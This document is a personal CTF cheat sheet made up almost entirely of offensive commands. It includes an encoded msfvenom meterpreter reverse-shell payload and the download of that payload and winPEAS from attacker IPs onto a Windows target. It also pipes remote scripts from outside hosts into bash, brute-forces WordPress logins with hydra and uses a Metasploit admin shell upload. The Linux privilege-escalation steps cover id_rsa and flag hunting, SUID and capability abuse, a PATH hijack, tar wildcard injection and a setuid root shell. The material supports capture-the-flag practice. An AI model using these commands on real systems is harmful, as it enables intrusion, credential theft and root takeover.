# My own|pwn Cheat Sheet for CTF's


### Info gathering using nmap
```
ip=10.10.10.10
nmap -sC -sV $ip
```

# SSH Tunnel
```
ssh -L 6969:localhost:8080 username@remote.host

```

# SMB

```
smbclient \\\\addres\\share -U username
```

# FTP 

ftp -i $ip
anonymous
binary
passive off


# Windows

```
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat 
python3 -m http.server

powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.115:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
cd C:\Windows\Temp\
winPEAS.bat
```
encoded

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.58.3 LPORT=9001 -f exe -o shell.exe
```

simple 

```
powershell -c "Invoke-WebRequest -Uri 'http://10.9.58.3:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"

```




Usually there is web and ssh ports openned. Let's scan web directories with gobuster.

# IF webserver check for directories

```
gobuster dir -u http://$ip/ -w /usr/share/wordlists/dirb/common.txt -t 20 -x php,txt
```


# Wordpress BruteForce

Prepare wordlist for 8 symbols
```
egrep '^.{8}$' /usr/share/wordlists/rockyou.txt > small.txt
```

```
hydra -l admin -P small.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

# Reverse Shell
```

```

### Upgrade the shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### CTRL + Z
```
stty raw -echo
fg
```
### Back to Reverse Shell

```
export TERM=xterm
```


## Reverse shell with MSF

```
use exploit/unix/webapp/wp_admin_shell_upload
```

additionally:

```
set WPCHECK false
set HttpClientTimeout 300

```


# Linux PrivEsc Insite the machine
```
curl linuxenum.savenas.lt -sL | bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -name "(flag*|user|root).txt" -exec cat {} \;
find / -name id_rsa 2> /dev/null
getcap -r / 2> /dev/null
cat /etc/crontab
sudo -l
```

if getcaps are:

###python
```
python: exit_code = os.system(‘/bin/sh’) output = os.popen(‘/bin/sh’).read()
```

### perl
```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

## If there is a command with relative path, let's clean global variables and use own

```
echo /bin/bash > /tmp/date && chmod +x /tmp/date
export PATH=/tmp:$PATH
```

### Priv Escalation Using Tar in crontab set 

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```
Wait 1 minute for the Bash script to execute.

```
/tmp/bash -p
```


### Post Explotation: sometimes works suggetor

curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -s | bash


# Dirty Cow

gcc -pthread dirtycow/c0w.c -o c0w


# SETUID

```
mkdir /tmp/1
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x

```




